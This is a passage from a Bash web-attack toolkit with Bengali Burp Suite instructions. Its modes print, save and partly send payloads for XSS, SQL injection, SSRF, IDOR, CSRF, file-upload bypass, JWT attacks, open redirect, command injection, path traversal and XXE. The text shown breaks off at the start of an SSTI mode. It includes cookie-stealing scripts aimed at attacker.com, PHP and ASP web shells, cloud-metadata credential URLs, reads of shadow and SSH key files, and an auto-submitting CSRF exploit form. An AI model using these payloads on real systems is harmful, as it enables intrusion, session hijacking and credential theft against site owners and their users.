        echo "$p" >> "$out"
    done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ DOM-based XSS ━━━${NC}"
    local dom_payloads=(
        '#"><img src=x onerror=alert(1)>'
        'javascript:void(document.body.innerHTML="<script>alert(1)<\/script>")'
        "';alert(1)//"
        '"-alert(1)-"'
        '\';alert(1)//'
    )
    for p in "${dom_payloads[@]}"; do
        echo -e "  ${MAGENTA}▸ $p${NC}"
        echo "$p" >> "$out"
    done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Stored XSS (HTML Context) ━━━${NC}"
    local stored_payloads=(
        '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>'
        '<img src=x onerror=this.src="http://attacker.com/?c="+document.cookie>'
        '<script>new Image().src="http://attacker.com/?c="+document.cookie</script>'
    )
    for p in "${stored_payloads[@]}"; do
        echo -e "  ${RED}▸ $p${NC}"
        echo "$p" >> "$out"
    done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Burp Intruder এ কীভাবে ব্যবহার করবেন ━━━${NC}"
    echo -e "  ${WHITE}1. Request Repeater এ পাঠান${NC}"
    echo -e "  ${WHITE}2. Parameter এ payload দিন${NC}"
    echo -e "  ${WHITE}3. Response এ payload reflect হয় কিনা দেখুন${NC}"
    echo -e "  ${WHITE}4. Intruder → Sniper → Payloads → payload list paste করুন${NC}"
    echo ""
    echo -e "${GREEN}[✓] Payloads saved: $out${NC}"
    echo ""

    # Test with curl
    read -p "$(echo -e ${YELLOW}"curl দিয়ে XSS test করবেন? (y/n): "${NC})" tc
    if [[ "$tc" =~ ^[Yy]$ ]]; then
        get_proxy_config
        echo ""
        for payload in "${basic_payloads[@]:0:3}"; do
            local encoded; encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
            echo -e "${CYAN}[*] Testing: $payload${NC}"
            local resp; resp=$(curl -s --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
                -G --data-urlencode "q=$payload" \
                "$TARGET_URL" -k --max-time 8 2>/dev/null)
            if echo "$resp" | grep -qF "$payload"; then
                echo -e "  ${RED}${BOLD}[!] REFLECTED! Potential XSS found!${NC}"
            else
                echo -e "  ${GREEN}[✓] Not reflected${NC}"
            fi
        done
    fi

    echo "$(date) | XSS Payloads | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 9 — SQLI PAYLOADS
# ================================================================
mode_sqli_payloads() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/sqli_payloads_${ts}.txt"

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          SQL INJECTION PAYLOADS                         ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Error-based Detection ━━━${NC}"
    local error_payloads=("'" "''" "' OR '1'='1" "' OR 1=1--" "' OR 1=1#" "1' ORDER BY 1--" "1' ORDER BY 2--" "1' ORDER BY 3--")
    for p in "${error_payloads[@]}"; do echo -e "  ${RED}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Boolean-based ━━━${NC}"
    local bool_payloads=("' AND 1=1--" "' AND 1=2--" "' AND 'a'='a" "' AND 'a'='b" "1 AND 1=1" "1 AND 1=2")
    for p in "${bool_payloads[@]}"; do echo -e "  ${YELLOW}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ UNION-based ━━━${NC}"
    local union_payloads=("' UNION SELECT NULL--" "' UNION SELECT NULL,NULL--" "' UNION SELECT NULL,NULL,NULL--" "' UNION SELECT 1,version(),3--" "' UNION SELECT 1,database(),3--" "' UNION SELECT 1,user(),3--")
    for p in "${union_payloads[@]}"; do echo -e "  ${MAGENTA}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Time-based Blind ━━━${NC}"
    local time_payloads=("' AND SLEEP(5)--" "'; WAITFOR DELAY '0:0:5'--" "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--" "1; SELECT pg_sleep(5)--")
    for p in "${time_payloads[@]}"; do echo -e "  ${BLUE}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Auth Bypass ━━━${NC}"
    local auth_payloads=("' OR '1'='1'--" "admin'--" "' OR 1=1#" "') OR ('1'='1" "admin' /*" "' OR 'x'='x")
    for p in "${auth_payloads[@]}"; do echo -e "  ${RED}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Burp এ SQLi Test করার পদ্ধতি ━━━${NC}"
    echo -e "  ${WHITE}1. Request Intercept করুন${NC}"
    echo -e "  ${WHITE}2. Parameter এর value select করুন${NC}"
    echo -e "  ${WHITE}3. Right-click → Send to Intruder${NC}"
    echo -e "  ${WHITE}4. Attack Type: Sniper, Payload: এই list${NC}"
    echo -e "  ${WHITE}5. Response length/time এ variation দেখুন${NC}"
    echo ""
    echo -e "${GREEN}[✓] Payloads saved: $out${NC}"
    echo ""
    echo -e "${CYAN}💡 SQLmap দিয়ে auto exploit করুন:${NC}"
    echo -e "  ${YELLOW}sqlmap -u '$TARGET_URL?id=1' --dbs --batch${NC}"
    echo ""
    echo "$(date) | SQLi Payloads | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 10 — SSRF PAYLOADS
# ================================================================
mode_ssrf_payloads() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/ssrf_payloads_${ts}.txt"

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          SSRF PAYLOAD GENERATOR                         ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Internal Network SSRF ━━━${NC}"
    local internal_payloads=(
        "http://127.0.0.1/"
        "http://localhost/"
        "http://0.0.0.0/"
        "http://[::1]/"
        "http://192.168.1.1/"
        "http://10.0.0.1/"
        "http://172.16.0.1/"
        "http://169.254.169.254/"
        "http://169.254.169.254/latest/meta-data/"
        "http://metadata.google.internal/"
    )
    for p in "${internal_payloads[@]}"; do echo -e "  ${RED}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ AWS Metadata (Cloud SSRF) ━━━${NC}"
    local aws_payloads=(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        "http://169.254.169.254/latest/meta-data/hostname"
        "http://169.254.169.254/latest/user-data"
        "http://100.100.100.200/latest/meta-data/"
    )
    for p in "${aws_payloads[@]}"; do echo -e "  ${YELLOW}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Protocol-based SSRF ━━━${NC}"
    local proto_payloads=(
        "file:///etc/passwd"
        "file:///etc/shadow"
        "dict://127.0.0.1:22/"
        "sftp://127.0.0.1/"
        "tftp://127.0.0.1/test"
        "gopher://127.0.0.1:25/smtp"
    )
    for p in "${proto_payloads[@]}"; do echo -e "  ${MAGENTA}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Bypass Techniques ━━━${NC}"
    local bypass_payloads=(
        "http://0177.0.0.1/"
        "http://0x7f.0x0.0x0.0x1/"
        "http://2130706433/"
        "http://127.1/"
        "http://127.000.000.001/"
    )
    for p in "${bypass_payloads[@]}"; do echo -e "  ${BLUE}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${GREEN}[✓] Payloads saved: $out${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Burp Collaborator দিয়ে Blind SSRF Test ━━━${NC}"
    echo -e "  ${WHITE}1. Burp → Project Options → Collaborator${NC}"
    echo -e "  ${WHITE}2. 'Copy to clipboard' করুন unique URL${NC}"
    echo -e "  ${WHITE}3. SSRF parameter এ সেই URL দিন${NC}"
    echo -e "  ${WHITE}4. Collaborator → 'Poll now' দিয়ে request দেখুন${NC}"
    echo ""
    echo "$(date) | SSRF Payloads | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 11 — IDOR HELPER
# ================================================================
mode_idor_helper() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          IDOR TEST HELPER                               ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ IDOR কী? ━━━${NC}"
    echo -e "  ${WHITE}Insecure Direct Object Reference — অন্য user এর data access করা${NC}"
    echo -e "  ${WHITE}উদাহরণ: /api/user/123 → /api/user/124 পরিবর্তন করে অন্যের data দেখা${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Common IDOR Locations ━━━${NC}"
    echo -e "  ${GREEN}▸ /api/users/{id}${NC}"
    echo -e "  ${GREEN}▸ /profile?id=123${NC}"
    echo -e "  ${GREEN}▸ /download?file=report_123.pdf${NC}"
    echo -e "  ${GREEN}▸ /orders/{order_id}${NC}"
    echo -e "  ${GREEN}▸ Cookie/Token এ encoded user ID${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Burp এ IDOR Test করার পদ্ধতি ━━━${NC}"
    echo -e "  ${WHITE}1. দুটি account দিয়ে login করুন (দুটি browser/incognito)${NC}"
    echo -e "  ${WHITE}2. Account A এর request intercept করুন${NC}"
    echo -e "  ${WHITE}3. User ID / Object ID change করুন Account B এর ID দিয়ে${NC}"
    echo -e "  ${WHITE}4. Response এ Account B এর data দেখা গেলে IDOR confirmed${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Intruder দিয়ে IDOR Automation ━━━${NC}"
    echo -e "  ${WHITE}1. Request → Send to Intruder${NC}"
    echo -e "  ${WHITE}2. ID parameter mark করুন: /user/§123§${NC}"
    echo -e "  ${WHITE}3. Payload: Numbers (1 to 1000)${NC}"
    echo -e "  ${WHITE}4. Attack চালান → 200 response গুলো দেখুন${NC}"
    echo ""

    # Auto test IDs
    read -p "$(echo -e ${YELLOW}"Auto IDOR test করবেন? (y/n): "${NC})" idor_auto
    if [[ "$idor_auto" =~ ^[Yy]$ ]]; then
        get_proxy_config
        read -p "$(echo -e ${WHITE}"Endpoint দিন (e.g. /api/user/): "${NC})" endpoint
        read -p "$(echo -e ${WHITE}"ID range (e.g. 1-20): "${NC})" id_range
        local start_id; start_id=$(echo "$id_range" | cut -d'-' -f1)
        local end_id;   end_id=$(echo "$id_range" | cut -d'-' -f2)

        local ts; ts=$(date +"%Y%m%d_%H%M%S")
        local out="$RESULTS_DIR/idor_test_${ts}.txt"

        echo ""
        echo -e "${CYAN}[*] IDOR test চালানো হচ্ছে...${NC}"
        for id in $(seq "$start_id" "$end_id"); do
            local url="${TARGET_URL}${endpoint}${id}"
            local resp code
            resp=$(curl -s --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
                -w "\n%{http_code}" -k --max-time 8 "$url" 2>/dev/null)
            code=$(echo "$resp" | tail -1)

            if [ "$code" == "200" ]; then
                echo -e "  ${GREEN}[✓] ID $id — 200 OK → $url${NC}"
                echo "ID $id: 200 OK → $url" >> "$out"
            else
                echo -e "  ${DIM}[✗] ID $id — $code${NC}"
            fi
        done
        echo ""
        echo -e "${GREEN}[✓] Results: $out${NC}"
    fi
}

# ================================================================
# MODE 12 — CSRF CHECKER
# ================================================================
mode_csrf_check() {
    get_proxy_config

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          CSRF VULNERABILITY CHECKER                     ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ CSRF Check করার পদ্ধতি ━━━${NC}"
    echo -e "  ${WHITE}1. State-changing request intercept করুন (POST/PUT/DELETE)${NC}"
    echo -e "  ${WHITE}2. CSRF token আছে কিনা দেখুন (csrf_token, _token, etc.)${NC}"
    echo -e "  ${WHITE}3. Token সরিয়ে request পাঠান — accept হলে vulnerable${NC}"
    echo -e "  ${WHITE}4. Token value change করুন — accept হলে vulnerable${NC}"
    echo -e "  ${WHITE}5. Origin/Referer header সরান — accept হলে vulnerable${NC}"
    echo ""

    # Check CSRF token in response
    read -p "$(echo -e ${WHITE}"Page URL দিন (form check করব): "${NC})" form_url
    [ -z "$form_url" ] && form_url="$TARGET_URL"

    echo ""
    echo -e "${CYAN}[*] Page analyze করা হচ্ছে CSRF token এর জন্য...${NC}"
    local page_content
    page_content=$(curl -s --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
        -k --max-time 10 "$form_url" 2>/dev/null)

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/csrf_check_${ts}.txt"

    {
        echo "CSRF Check: $form_url"
        echo "Date: $(date)"
        echo ""

        if echo "$page_content" | grep -qi "csrf\|_token\|nonce\|xsrf"; then
            echo -e "  ${GREEN}[✓] CSRF Token পাওয়া গেছে${NC}"
            echo "CSRF token: FOUND"
            # Extract token
            local token
            token=$(echo "$page_content" | grep -oiE 'name="[_]?csrf[_token]*" value="[^"]*"' | head -1)
            [ -n "$token" ] && echo -e "  ${CYAN}Token field: $token${NC}" && echo "Token: $token"
        else
            echo -e "  ${RED}${BOLD}[!] CSRF Token পাওয়া যায়নি! Potentially Vulnerable!${NC}"
            echo "CSRF token: NOT FOUND - POTENTIALLY VULNERABLE"
        fi

        # Check SameSite cookie
        local cookies
        cookies=$(curl -s -I --proxy "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
            -k --max-time 8 "$form_url" 2>/dev/null | grep -i "Set-Cookie")
        if echo "$cookies" | grep -qi "SameSite"; then
            echo -e "  ${GREEN}[✓] SameSite cookie attribute set${NC}"
        else
            echo -e "  ${YELLOW}[!] SameSite attribute নেই — CSRF ঝুঁকি বাড়ে${NC}"
        fi

    } | tee "$out"

    echo ""
    echo -e "${CYAN}${BOLD}━━━ CSRF Exploit Template ━━━${NC}"
    echo -e "${DIM}<!-- এই HTML টি attacker এর page এ থাকবে -->${NC}"
    echo -e "${YELLOW}<form method='POST' action='${TARGET_URL}/vulnerable-endpoint'>${NC}"
    echo -e "${YELLOW}  <input name='amount' value='1000'>${NC}"
    echo -e "${YELLOW}  <input type='submit' value='Click me'>${NC}"
    echo -e "${YELLOW}</form>${NC}"
    echo -e "${YELLOW}<script>document.forms[0].submit();</script>${NC}"
    echo ""
    echo -e "${GREEN}[✓] Report saved: $out${NC}"
    echo "$(date) | CSRF Check | $form_url | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 13 — FILE UPLOAD BYPASS
# ================================================================
mode_file_upload_bypass() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/upload_bypass_${ts}.txt"

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          FILE UPLOAD BYPASS PAYLOADS                    ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Extension Bypass ━━━${NC}"
    local ext_payloads=("shell.php" "shell.php5" "shell.php7" "shell.phtml" "shell.pHp" "shell.PHP" "shell.php.jpg" "shell.jpg.php" "shell.php%00.jpg" "shell.php\x00.jpg" "shell.asp" "shell.aspx" "shell.jsp")
    for p in "${ext_payloads[@]}"; do echo -e "  ${RED}▸ $p${NC}"; echo "$p" >> "$out"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Content-Type Bypass ━━━${NC}"
    echo -e "  ${WHITE}Content-Type: image/jpeg (PHP file পাঠাতে)${NC}"
    echo -e "  ${WHITE}Content-Type: image/png${NC}"
    echo -e "  ${WHITE}Content-Type: image/gif${NC}"
    echo -e "  ${DIM}Burp এ Content-Type header manually change করুন${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Magic Bytes Bypass ━━━${NC}"
    echo -e "  ${WHITE}File এর শুরুতে এই bytes add করুন:${NC}"
    echo -e "  ${GREEN}▸ GIF: GIF89a; (তারপর PHP code)${NC}"
    echo -e "  ${GREEN}▸ PNG: \\x89PNG (তারপর PHP code)${NC}"
    echo -e "  ${DIM}উদাহরণ: GIF89a;<?php system(\$_GET['cmd']); ?>${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Web Shell Payloads ━━━${NC}"
    echo -e "  ${RED}PHP Basic:${NC}"
    echo -e "  ${YELLOW}<?php system(\$_GET['cmd']); ?>${NC}"
    echo -e ""
    echo -e "  ${RED}PHP Stealth:${NC}"
    echo -e "  ${YELLOW}<?php \$c=\$_REQUEST['c'];\$f=fopen(\"/tmp/shell.sh\",\"w\");fputs(\$f,\$c);fclose(\$f);system(\"/bin/bash /tmp/shell.sh\"); ?>${NC}"
    echo ""
    echo -e "  ${RED}ASP Web Shell:${NC}"
    echo -e "  ${YELLOW}<% Response.Write CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll() %>${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Burp এ Upload Test করার পদ্ধতি ━━━${NC}"
    echo -e "  ${WHITE}1. File upload request intercept করুন${NC}"
    echo -e "  ${WHITE}2. filename parameter change করুন: shell.php${NC}"
    echo -e "  ${WHITE}3. Content-Type: image/jpeg set করুন${NC}"
    echo -e "  ${WHITE}4. File content: <?php system(\$_GET['cmd']); ?>${NC}"
    echo -e "  ${WHITE}5. Forward করুন — upload path খুঁজুন${NC}"
    echo -e "  ${WHITE}6. Access করুন: /uploads/shell.php?cmd=id${NC}"
    echo ""
    echo -e "${GREEN}[✓] Guide saved: $out${NC}"
    echo "$(date) | Upload Bypass | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 14 — JWT ANALYZER
# ================================================================
mode_jwt_analyzer() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          JWT TOKEN ANALYZER                             ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    read -p "$(echo -e ${WHITE}"JWT Token paste করুন: "${NC})" jwt_token
    [ -z "$jwt_token" ] && echo -e "${RED}[!] Token দিন।${NC}" && return

    echo ""
    local header payload
    header=$(echo "$jwt_token" | cut -d'.' -f1)
    payload=$(echo "$jwt_token" | cut -d'.' -f2)

    # Decode base64
    local decoded_header decoded_payload
    decoded_header=$(echo "$header" | base64 -d 2>/dev/null || \
        python3 -c "import base64,sys; s=sys.argv[1]; s+='=='*((4-len(s)%4)%4); print(base64.b64decode(s).decode())" "$header" 2>/dev/null)
    decoded_payload=$(echo "$payload" | base64 -d 2>/dev/null || \
        python3 -c "import base64,sys; s=sys.argv[1]; s+='=='*((4-len(s)%4)%4); print(base64.b64decode(s).decode())" "$payload" 2>/dev/null)

    echo -e "${CYAN}${BOLD}━━━ JWT Header ━━━${NC}"
    echo -e "  ${GREEN}$decoded_header${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ JWT Payload ━━━${NC}"
    echo -e "  ${YELLOW}$decoded_payload${NC}"
    echo ""

    # Algorithm check
    if echo "$decoded_header" | grep -qi '"alg"\s*:\s*"none"'; then
        echo -e "  ${RED}${BOLD}[!] Algorithm: none — CRITICAL VULNERABILITY!${NC}"
        echo -e "  ${RED}→ Signature verification skip হচ্ছে!${NC}"
    elif echo "$decoded_header" | grep -qi '"alg"\s*:\s*"HS256"'; then
        echo -e "  ${CYAN}[*] Algorithm: HS256 (HMAC-SHA256)${NC}"
        echo -e "  ${YELLOW}→ Secret key weak হলে brute force সম্ভব।${NC}"
    elif echo "$decoded_header" | grep -qi '"alg"\s*:\s*"RS256"'; then
        echo -e "  ${CYAN}[*] Algorithm: RS256 (RSA)${NC}"
        echo -e "  ${YELLOW}→ Algorithm confusion attack try করুন (RS256 → HS256)${NC}"
    fi

    echo ""
    echo -e "${CYAN}${BOLD}━━━ JWT Attack Techniques ━━━${NC}"
    echo -e "  ${RED}1. Algorithm None Attack:${NC}"
    echo -e "     ${DIM}Header এ alg=none করুন, signature সরান${NC}"
    echo ""
    echo -e "  ${RED}2. HS256 Brute Force:${NC}"
    echo -e "     ${CYAN}hashcat -m 16500 '$jwt_token' rockyou.txt${NC}"
    echo ""
    echo -e "  ${RED}3. Algorithm Confusion (RS256→HS256):${NC}"
    echo -e "     ${DIM}Public key দিয়ে HS256 sign করুন${NC}"
    echo ""
    echo -e "  ${RED}4. Burp JWT Editor Extension:${NC}"
    echo -e "     ${WHITE}BApp Store → JWT Editor install করুন${NC}"
    echo ""

    # Expiry check
    if echo "$decoded_payload" | grep -q '"exp"'; then
        local exp; exp=$(echo "$decoded_payload" | grep -o '"exp":[0-9]*' | cut -d: -f2)
        local now; now=$(date +%s)
        if [ -n "$exp" ] && [ "$exp" -lt "$now" ]; then
            echo -e "  ${RED}[!] Token EXPIRED! (exp: $(date -d @$exp 2>/dev/null || date -r $exp))${NC}"
        else
            echo -e "  ${GREEN}[✓] Token valid (exp: $(date -d @$exp 2>/dev/null || echo $exp))${NC}"
        fi
    fi

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/jwt_analysis_${ts}.txt"
    {
        echo "JWT Analysis — $(date)"
        echo "Header: $decoded_header"
        echo "Payload: $decoded_payload"
    } > "$out"
    echo ""
    echo -e "${GREEN}[✓] Analysis saved: $out${NC}"
    echo "$(date) | JWT Analysis | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 15 — OPEN REDIRECT
# ================================================================
mode_open_redirect() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/open_redirect_${ts}.txt"

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          OPEN REDIRECT PAYLOADS                         ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local payloads=(
        "//evil.com" "//evil.com/" "///evil.com" "////evil.com"
        "https://evil.com" "http://evil.com"
        "/\\evil.com" "\/evil.com" "/\/evil.com"
        "https:///evil.com" "https:////evil.com"
        "%2F%2Fevil.com" "%2Fevil.com"
        "javascript:alert(1)" "data:text/html,<script>alert(1)</script>"
        "//google.com%2f%2f@evil.com" "/redirect?url=evil.com"
        "https://trusted.com.evil.com"
    )

    for p in "${payloads[@]}"; do
        echo -e "  ${RED}▸ $p${NC}"
        echo "$p" >> "$out"
    done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Common Redirect Parameters ━━━${NC}"
    local params=("url=" "redirect=" "next=" "return=" "goto=" "dest=" "destination=" "target=" "redir=" "redirect_url=" "return_url=" "back=" "forward=")
    for p in "${params[@]}"; do echo -e "  ${YELLOW}▸ $p${NC}"; done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Test করার পদ্ধতি ━━━${NC}"
    echo -e "  ${WHITE}${TARGET_URL}?redirect=//evil.com${NC}"
    echo -e "  ${WHITE}${TARGET_URL}?next=https://evil.com${NC}"
    echo ""
    echo -e "${GREEN}[✓] Payloads saved: $out${NC}"
    echo "$(date) | Open Redirect | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 16 — COMMAND INJECTION
# ================================================================
mode_cmd_injection() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/cmdi_payloads_${ts}.txt"

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          COMMAND INJECTION PAYLOADS                     ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local payloads=(
        "; id" "& id" "| id" "\`id\`" "$(id)"
        "; ls -la" "& ls -la" "| ls -la"
        "; cat /etc/passwd" "| cat /etc/passwd"
        "; whoami" "& whoami" "| whoami"
        "; id #" "& id #" "' ; id #" "\" ; id #"
        "; id > /tmp/out" "& id > /tmp/out"
        "$(sleep 5)" "; sleep 5" "| sleep 5" "& sleep 5"
        "%0a id" "%0d%0a id" "\r\n id"
        "; ping -c 1 attacker.com"
        "| nslookup attacker.com"
        "'; exec('id');"
    )

    for p in "${payloads[@]}"; do
        echo -e "  ${RED}▸ $p${NC}"
        echo "$p" >> "$out"
    done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Blind Command Injection Detection ━━━${NC}"
    echo -e "  ${WHITE}Time-based: ; sleep 10 → response delay হলে vulnerable${NC}"
    echo -e "  ${WHITE}OOB: ; nslookup burp-collaborator.net → DNS lookup দেখুন${NC}"
    echo -e "  ${WHITE}Burp Collaborator URL ব্যবহার করুন OOB detection এ${NC}"
    echo ""
    echo -e "${GREEN}[✓] Payloads saved: $out${NC}"
    echo "$(date) | CmdI Payloads | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 17 — PATH TRAVERSAL
# ================================================================
mode_path_traversal() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/path_traversal_${ts}.txt"

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          PATH TRAVERSAL PAYLOADS                        ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local payloads=(
        "../../../etc/passwd"
        "../../../../etc/passwd"
        "../../../../../etc/passwd"
        "..%2F..%2F..%2Fetc%2Fpasswd"
        "..%252F..%252F..%252Fetc%252Fpasswd"
        "....//....//....//etc/passwd"
        "..././..././etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "..%c0%af..%c0%af..%c0%afetc/passwd"
        "/etc/passwd"
        "C:\\Windows\\System32\\drivers\\etc\\hosts"
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
        "../../../../windows/win.ini"
    )

    for p in "${payloads[@]}"; do
        echo -e "  ${RED}▸ $p${NC}"
        echo "$p" >> "$out"
    done

    echo ""
    echo -e "${CYAN}${BOLD}━━━ Sensitive Files ━━━${NC}"
    local files=("/etc/passwd" "/etc/shadow" "/etc/hosts" "~/.ssh/id_rsa" "/proc/self/environ" "/var/log/apache2/access.log" "C:\\Windows\\win.ini" "C:\\Windows\\System32\\config\\SAM")
    for f in "${files[@]}"; do echo -e "  ${YELLOW}▸ $f${NC}"; done

    echo ""
    echo -e "${GREEN}[✓] Payloads saved: $out${NC}"
    echo "$(date) | Path Traversal | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 18 — XXE PAYLOADS
# ================================================================
mode_xxe_payloads() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/xxe_payloads_${ts}.txt"

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          XXE PAYLOAD GENERATOR                          ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Basic XXE ━━━${NC}"
    cat << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
EOF
    echo ""

    echo -e "${CYAN}${BOLD}━━━ SSRF via XXE ━━━${NC}"
    cat << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
EOF
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Blind XXE (OOB) ━━━${NC}"
    cat << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR/evil.dtd">
  %xxe;
]>
<root>&exfil;</root>
EOF
    echo ""

    echo -e "${CYAN}${BOLD}━━━ XXE via SVG Upload ━━━${NC}"
    cat << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF
    echo ""

    echo -e "${CYAN}${BOLD}━━━ Burp এ XXE Test ━━━${NC}"
    echo -e "  ${WHITE}1. XML body আছে এমন request intercept করুন${NC}"
    echo -e "  ${WHITE}2. DOCTYPE declaration add করুন${NC}"
    echo -e "  ${WHITE}3. Entity define ও reference করুন${NC}"
    echo -e "  ${WHITE}4. Response এ file content দেখুন${NC}"
    echo ""
    echo -e "${GREEN}[✓] Payloads saved: $out${NC}"
    echo "$(date) | XXE Payloads | $TARGET_URL | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 19 — SSTI PAYLOADS
# ================================================================
mode_ssti_payloads() {
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/ssti_payloads_${ts}.txt"

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          SSTI PAYLOAD GENERATOR                         ║${NC}"
